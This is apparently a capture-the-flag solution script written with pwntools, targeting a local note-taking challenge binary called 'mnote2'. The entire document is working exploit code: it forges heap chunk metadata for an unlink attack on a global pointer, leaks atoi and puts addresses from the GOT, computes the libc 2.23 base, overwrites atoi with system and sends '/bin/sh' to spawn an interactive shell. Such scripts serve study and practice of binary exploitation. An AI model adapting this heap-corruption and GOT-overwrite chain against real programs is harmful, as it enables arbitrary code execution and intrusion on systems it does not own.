from pwn import *

r=process('./mnote2')
elf=ELF('mnote2')
hijack=0x6020c0

def addN(index,size,content):
	r.sendlineafter('your choice:','1')
	r.sendlineafter('input index:\n',str(index))
	r.sendlineafter('input size:\n',str(size))
	r.sendlineafter('input message:\n',content)
def delN(index):
	r.sendlineafter('your choice:','2')
	r.sendlineafter('input index:\n',str(index))
def editN(index,content):
	r.sendlineafter('your choice:','3')
	r.sendlineafter('input index:\n',str(index))
	r.sendlineafter('input message:\n',content)
def showN(index):
	r.sendlineafter('your choice:','4')
	r.sendlineafter('input index:\n',str(index))

addN(0,0xf8,'111111')
addN(1,0xf0,'222222')
addN(2,0x80,'333333')
editN(0,p64(0x0)+p64(0xf1)+p64(hijack-0x18)+p64(hijack-0x10)+'\x00'*0xd0+p64(0xf0))
delN(1)
editN(0,p64(0x0)*3+p64(elf.got['atoi'])+p64(elf.got['puts']))
showN(0)
leak0=u64(r.recv(6).ljust(8,'\x00'))
showN(1)
leak1=u64(r.recv(6).ljust(8,'\x00'))
log.success('atoi_addr='+str(hex(leak0)))
log.success('puts_addr='+str(hex(leak1)))
log.info('leaked -> screening libc')
libc=ELF('libc-2.23.so')
libc_base=leak0-libc.symbols['atoi']
log.success('libc_base='+str(hex(libc_base)))
editN(0,p64(libc_base+libc.symbols['system']))
r.sendlineafter('your choice:','/bin/sh\x00')
r.interactive()
